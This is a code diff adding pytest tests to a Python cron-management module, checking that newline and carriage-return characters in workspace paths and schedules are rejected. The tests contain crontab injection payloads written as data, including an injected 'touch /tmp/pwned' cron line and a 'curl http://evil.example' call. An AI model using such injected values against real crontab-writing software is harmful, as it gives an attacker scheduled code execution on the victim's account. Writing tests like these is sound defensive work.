@@ -1,5 +1,6 @@
 """Tests for hermes cron module."""
 
+import pytest
 from unittest.mock import MagicMock, patch, call
 
 from hermes.cron import (
@@ -281,3 +282,42 @@ class TestListInstalled:
     @patch("hermes.cron._read_crontab", return_value=None)
     def test_read_failure(self, _):
         assert CrontabManager.list_installed("/ws") == []
+
+
+class TestCronLineBreakGuard:
+    """A crontab is line-based: an interpolated value carrying a line
+    break splits the entry and installs everything after the break as an
+    independent, attacker-chosen cron line — scheduled code execution as
+    the user. Shell quoting cannot prevent this; the values are refused."""
+
+    def test_build_cron_line_rejects_newline_workspace(self):
+        with pytest.raises(ValueError):
+            _build_cron_line("/tmp/legit\n* * * * * touch /tmp/pwned", "0 * * * *")
+
+    def test_build_cron_line_rejects_carriage_return_workspace(self):
+        with pytest.raises(ValueError):
+            _build_cron_line("/tmp/ws\r* * * * * x", "0 * * * *")
+
+    def test_build_cron_line_rejects_newline_schedule(self):
+        with pytest.raises(ValueError):
+            _build_cron_line("/ws", "*\n* * * * *")
+
+    def test_validate_cron_expr_rejects_embedded_newline(self):
+        # The field regex alone accepts this shape: \s matches newlines.
+        assert validate_cron_expr("*\n* * * * *") is False
+        assert validate_cron_expr("0 * * * *\ncurl http://evil.example") is False
+
+    @patch("hermes.cron.os.close")
+    @patch("hermes.cron.os.open", return_value=99)
+    @patch("hermes.cron.fcntl.flock")
+    @patch("hermes.cron._write_crontab", return_value=True)
+    @patch("hermes.cron._read_crontab")
+    def test_sync_fails_closed_on_newline_workspace(
+        self, mock_read, mock_write, _flock, _open, _close
+    ):
+        result = CrontabManager.sync(
+            "/tmp/legit\n* * * * * touch /tmp/pwned", ["0 * * * *"]
+        )
+        assert result is False
+        mock_read.assert_not_called()
+        mock_write.assert_not_called()
